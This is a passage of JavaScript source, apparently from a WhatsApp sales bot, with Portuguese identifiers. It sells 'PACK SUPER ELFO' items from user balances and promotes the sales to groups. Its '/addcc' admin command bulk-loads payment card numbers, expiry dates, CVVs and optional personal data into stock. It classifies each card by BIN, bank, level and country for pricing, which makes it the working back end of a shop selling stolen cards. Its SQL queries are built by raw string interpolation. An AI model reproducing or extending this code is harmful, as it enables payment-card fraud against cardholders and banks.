'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                return
            }

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

            VALOR_PACOTE_ELFO = "100"

            console.log(`SALDO USER: ${SALDO_USUARIO} | VALOR PACOTE: ${VALOR_PACOTE_ELFO}`)

            if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_PACOTE_ELFO)) {

                Texto = `⚠️*Você não possui saldo suficiente para comprar o PACK SUPER ELFO.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_PACOTE_ELFO)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

            Array_Material = await DataBase_Better.prepare(`SELECT * FROM PACK_SUPER_ELFO LIMIT 1`).all()
            shuffle(Array_Material);

            Rowid = await DataBase_Better.prepare(`SELECT _rowid_ FROM PACK_SUPER_ELFO LIMIT 1`).all()

            await DataBase_Better.prepare(`INSERT INTO PACK_SUPER_ELFO_VENDIDOS (MATERIAL,VALOR,NUMERO_COMPRADOR,DATA_INSERIDO_MS) VALUES ('${Array_Material[0]["MATERIAL"]}','${VALOR_PACOTE_ELFO}','${Mensagem_From}','${Date.now()}')`).run()
            await DataBase_Better.prepare(`DELETE FROM PACK_SUPER_ELFO WHERE _rowid_ = ${Rowid[0]["rowid"]}`).run()

            MENSAGEM_AO_COMPRAR_ELFO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_ELFO'`).get()["VALOR"]

            Texto_Usuario = `📦 *PACK SUPER ELFO COMPRADO 🧝🏼‍♂️*

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
💰 *VALOR PACOTE: R$:* ${VALOR_PACOTE_ELFO}

${Array_Material[0]["MATERIAL"]}

× •-•-•-•⟮ ◆ ⟯•-•-•-• ×

${MENSAGEM_AO_COMPRAR_ELFO}
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Texto_Grupo = `🧝🏼‍♂️ *USUÁRIO COMPROU UM PACK SUPER ELFO* 📦

👤 *USUÁRIO:* wa.me/${Numero}

────────────────

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`

            for await (Grupo of ID_GRUPOS) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'./Fotos_${Nome_Dono}/comprou_pct_elfo_gp.jpeg',
'${Date.now()}')`).run()
            }

            Texto_Adms = `*ADMS: 🧝🏼‍♂️ PACOTE SUPER ELFO COMPRADO*

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
💰 *VALOR: R$:* ${VALOR_PACOTE_ELFO}`

            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }
            console.log(`Pack Elfo Comprado Numero: wa.me/${Numero} | Valor: ${VALOR_PACOTE_ELFO}`)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 





        //addcc===NUMERO|MES|ANO|CVV
        //addcc===NUMERO|MES|ANO|CVV|DADOS
        //addccfull===NUMERO|MES|ANO|CVV|DADOS

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addcc") > -1 && Mensagem_Texto.indexOf("===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[0].indexOf("full") > -1) {
                TIPOCC = "2"
            } else {
                TIPOCC = "1"
            }

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            Array_Fila_Espera = []
            try {

                if (TIPOCC.toString() === "1") {
                    Texto = "*ABASTECENDO CCs...*"
                } else {
                    Texto = "*ABASTECENDO CCs FULL DADOS...*"
                }

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = Mensagem_Texto.split("\n")
                Contagem_Abastecidas = 0
                Contagem_Duplicadas = 0

                for (var index = 0; index < Linhas.length; index++) {

                    Abastecendo = true
                    Linha = Linhas[index].replace(/\/addccfull\=\=\=|\/addcc\=\=\=/igm, '');
                    Linha = Linha.replace(/[^a-zA-Z0-9\s\|\n]/igm, '');
                    Div = Linha.split("|")
                    NUMERO = Div[0]
                    NUMERO = Div[0].replace(/[^0-9]/igm, '');
                    MES = Div[1]
                    ANO = Div[2]
                    console.log(Linha)
                    console.log(ANO)
                    Digito = ANO.match(/./igm)
                    console.log(Digito)
                    if (Digito.length == 4) {
                        ANO = `${Digito[2]}${Digito[3]}`
                    }
                    CVV = Div[3]

                    if (Div[4] === undefined) {
                        DADOS = "#"
                    } else {
                        DADOS = Linha
                    }

                    console.log(``)
                    console.log(`Inserindo CC Número ${NUMERO}...`)

                    Ja_Tem = await DataBase_Better.prepare(`SELECT NUMERO,MES,ANO,CVV FROM CCS WHERE NUMERO == '${NUMERO}' AND MES == '${MES}' AND ANO == '${ANO}' AND CVV == '${CVV}'`).all()
                    // await delay(10)
                    if (Ja_Tem.length != 0) {
                        Contagem_Duplicadas = parseInt(Contagem_Duplicadas) + 1
                        console.log("Duplicada")
                        console.log(Contagem_Duplicadas)
                    } else {
                        Digito_BIN = NUMERO.toString().match(/./igm)
                        BIN = `${Digito_BIN[0]}${Digito_BIN[1]}${Digito_BIN[2]}${Digito_BIN[3]}${Digito_BIN[4]}${Digito_BIN[5]}`

                        INFORMACOES_BIN = await BIN_CHECKER(NUMERO)
                        console.log(INFORMACOES_BIN)
                        DIV_INFORMACOES_BIN = INFORMACOES_BIN.split("\",\"")
                        BIN_QUE_VEIO = DIV_INFORMACOES_BIN[2].split("\":\"")[1]

                        BININFO_BIN = await DataBase_Better.prepare(`SELECT NOME FROM BININFO_BIN WHERE BIN = '${BIN_QUE_VEIO}' AND PARAMETRO = 'BANCO' LIMIT 1`).all()
                        if (BININFO_BIN.length > 0) {
                            BANCO = BININFO_BIN[0]["NOME"]
                        } else {
                            DIV_INFORMACOES_BIN_PARAMETRO = DIV_INFORMACOES_BIN[0].split("\":\"")
                            BINPERSONALIZADA_BANCO = await DataBase_Better.prepare(`SELECT NOVO_NOME FROM BINPERSONALIZADA_BANCO WHERE CONTEM_NOME = '${DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z]/igm, '')}' LIMIT 1`).all()
                            if (BINPERSONALIZADA_BANCO.length > 0) {
                                BANCO = BINPERSONALIZADA_BANCO[0]["NOVO_NOME"]
                            } else {
                                if (DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '') === "") {
                                    BANCO = "OUTROS"
                                } else {
                                    BANCO = DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '');
                                }
                            }
                        }
                        BININFO_BIN = await DataBase_Better.prepare(`SELECT NOME FROM BININFO_BIN WHERE BIN = '${BIN_QUE_VEIO}' AND PARAMETRO = 'BANDEIRA' LIMIT 1`).all()
                        if (BININFO_BIN.length > 0) {
                            BANDEIRA = BININFO_BIN[0]["NOME"]
                        } else {
                            DIV_INFORMACOES_BIN_PARAMETRO = DIV_INFORMACOES_BIN[1].split("\":\"")
                            BINPERSONALIZADA_BANDEIRA = await DataBase_Better.prepare(`SELECT NOVO_NOME FROM BINPERSONALIZADA_BANDEIRA WHERE CONTEM_NOME = '${DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '')}' LIMIT 1`).all()
                            if (BINPERSONALIZADA_BANDEIRA.length > 0) {
                                BANDEIRA = BINPERSONALIZADA_BANDEIRA[0]["NOVO_NOME"]
                            } else {
                                if (DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '') === "") {
                                    BANDEIRA = "OUTROS"
                                } else {
                                    BANDEIRA = DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '');
                                }
                            }
                        }

                        BININFO_BIN = await DataBase_Better.prepare(`SELECT NOME FROM BININFO_BIN WHERE BIN = '${BIN_QUE_VEIO}' AND PARAMETRO = 'NIVEL' LIMIT 1`).all()
                        if (BININFO_BIN.length > 0) {
                            NIVEL = BININFO_BIN[0]["NOME"]
                        } else {
                            BINPERSONALIZADA_BANDEIRA_NIVEL = await DataBase_Better.prepare(`SELECT NOVO_NOME FROM BINPERSONALIZADA_BANDEIRA_NIVEL WHERE CONTEM_NOME = '${DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '')}' LIMIT 1`).all()
                            if (BINPERSONALIZADA_BANDEIRA_NIVEL.length > 0) {
                                NIVEL = BINPERSONALIZADA_BANDEIRA_NIVEL[0]["NOVO_NOME"]
                            } else {

                                DIV_INFORMACOES_BIN_PARAMETRO = DIV_INFORMACOES_BIN[3].split("\":\"")
                                BINPERSONALIZADA_NIVEL = await DataBase_Better.prepare(`SELECT NOVO_NOME FROM BINPERSONALIZADA_NIVEL WHERE CONTEM_NOME = '${DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '')}' LIMIT 1`).all()
                                if (BINPERSONALIZADA_NIVEL.length > 0) {
                                    NIVEL = BINPERSONALIZADA_NIVEL[0]["NOVO_NOME"]
                                } else {
                                    if (DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '') === "") {
                                        NIVEL = "OUTROS"
                                    } else {
                                        NIVEL = DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '');
                                    }
                                }
                            }
                        }

                        BININFO_BIN = await DataBase_Better.prepare(`SELECT NOME FROM BININFO_BIN WHERE BIN = '${BIN_QUE_VEIO}' AND PARAMETRO = 'PAIS' LIMIT 1`).all()
                        if (BININFO_BIN.length > 0) {
                            PAIS = BININFO_BIN[0]["NOME"]
                        } else {
                            DIV_INFORMACOES_BIN_PARAMETRO = DIV_INFORMACOES_BIN[4].split("\":\"")
                            BINPERSONALIZADA_PAIS = await DataBase_Better.prepare(`SELECT NOVO_NOME FROM BINPERSONALIZADA_PAIS WHERE CONTEM_NOME = '${DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '')}' LIMIT 1`).all()
                            if (BINPERSONALIZADA_PAIS.length > 0) {
                                PAIS = BINPERSONALIZADA_PAIS[0]["NOVO_NOME"]
                            } else {
                                if (DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '') === "") {
                                    PAIS = "OUTROS"
                                } else {
                                    PAIS = DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '');
                                }
                            }
                        }

                        DIV_INFORMACOES_BIN_PARAMETRO = DIV_INFORMACOES_BIN[5].split("\":\"")
                        if (DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '') === "") {
                            TIPO = "OUTROS"
                        } else {
                            TIPO = DIV_INFORMACOES_BIN_PARAMETRO[1].toString().replace(/[^a-zA-Z\s]/igm, '')
                        }


                        if (TIPOCC.toString() === "1") {
                            await DataBase_Better.prepare(`INSERT INTO CCS (NUMERO,BIN,MES,ANO,CVV,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,DADOS,TIPOCC,Data_MS_Inserido) VALUES ('${NUMERO}','${BIN}','${MES}','${ANO}','${CVV}','${BANDEIRA}','${TIPO}','${NIVEL}','${BANCO}','${PAIS}','${DADOS}','1','${Date.now()}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_NIVEL (NIVEL) VALUES ('${NIVEL}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BANDEIRA (BANDEIRA) VALUES ('${BANDEIRA}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BANCO (BANCO) VALUES ('${BANCO}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_PAIS (PAIS) VALUES ('${PAIS}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BIN (BIN) VALUES ('${BIN}') ON CONFLICT DO NOTHING`).run()
                        } else {
                            await DataBase_Better.prepare(`INSERT INTO CCS (NUMERO,BIN,MES,ANO,CVV,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,DADOS,TIPOCC,Data_MS_Inserido) VALUES ('${NUMERO}','${BIN}','${MES}','${ANO}','${CVV}','${BANDEIRA}','${TIPO}','${NIVEL}','${BANCO}','${PAIS}','${DADOS}','2','${Date.now()}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_NIVEL_FULL (NIVEL) VALUES ('${NIVEL}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BANDEIRA_FULL (BANDEIRA) VALUES ('${BANDEIRA}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BANCO_FULL (BANCO) VALUES ('${BANCO}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_PAIS_FULL (PAIS) VALUES ('${PAIS}') ON CONFLICT DO NOTHING`).run()
                            await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BIN_FULL (BIN) VALUES ('${BIN}') ON CONFLICT DO NOTHING`).run()
                        }

                        Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                        console.log(`ABASTECIDAS ${Contagem_Abastecidas}/${Linhas.length}`)

                        if (Contagem_Abastecidas.toString().indexOf("00") > -1) {
                            Texto = `${Contagem_Abastecidas} CCs Abastecidas até o momento.`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                    }
                }

                Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} CCs Colocadas para abastecimento.

${Contagem_Abastecidas} CCs Abastecidas.

${Contagem_Duplicadas} CCs Duplicadas que não entraram.`

                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Abastecendo = false
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(error)
                Abastecendo = false
                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas} CCs, porém você terá que tentar denovo, só que certo dessa vez!

Não tem problema abastecer as mesmas, pois não entra duplicada no estoque.

Verifique o formato que está abastecendo e tente novamente.

Erro: ${error}`

                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Abastecendo = false
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
